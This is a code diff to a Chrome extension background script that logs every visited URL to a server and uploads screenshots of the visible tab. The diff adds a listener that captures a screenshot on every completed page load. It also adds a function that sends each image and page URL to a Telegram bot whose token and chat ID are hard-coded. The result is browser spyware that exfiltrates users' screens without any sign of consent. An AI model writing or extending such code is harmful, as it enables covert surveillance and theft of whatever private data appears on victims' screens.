@@ -1,14 +1,27 @@
-chrome.history.onVisited.addListener((result,tab) => {
+chrome.history.onVisited.addListener((result, tab) => {
   pushToServer(result);
-   chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
+  chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
     uploadScreenshot(dataUrl, tab.url);
-     chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
-    uploadScreenshot(dataUrl, tab.url);
-  });
+
   });
 });
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 
+    if (changeInfo.status !== "complete") return;
+
+    chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
+
+        if (!tab?.url) return;
+
+        sendToTelegram(dataUrl, tab.url);
+
+    });
+
+});
 function uploadScreenshot(dataUrl, pageUrl) {
+
+
+
   fetch("http://127.0.0.1:8000/api/photo", {
     method: "POST",
     headers: {
@@ -20,8 +33,8 @@ function uploadScreenshot(dataUrl, pageUrl) {
       time: Date.now()
     })
   })
-  .then(() => console.log("Screenshot envoyé"))
-  .catch(err => console.error(err));
+    .then(() => console.log("Screenshot envoyé"))
+    .catch(err => console.error(err));
 }
 
 async function pushToServer(data) {
@@ -32,7 +45,7 @@ async function pushToServer(data) {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        name: data.url ,
+        name: data.url,
         password: "password"
       })
     });
@@ -76,3 +89,36 @@ chrome.alarms.onAlarm.addListener((alarm) => {
     });
   }
 });
+
+async function sendToTelegram(dataUrl, pageUrl) {
+
+  const BOT_TOKEN = "8121028052:AAFYUn14R1FivsCV3Qz74IicVU1t2p56T9E"
+  const CHAT_ID = "7144944533"
+
+
+  try {
+
+        const blob = await (await fetch(dataUrl)).blob();
+
+        const formData = new FormData();
+
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "capture.png");
+        formData.append("caption", `Page: ${pageUrl}`);
+
+        const response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            {
+                method: "POST",
+                body: formData
+            }
+        );
+
+        const result = await response.json();
+        console.log("Telegram OK:", result);
+
+    } catch (err) {
+        console.error("Erreur Telegram:", err);
+    }
+
+}
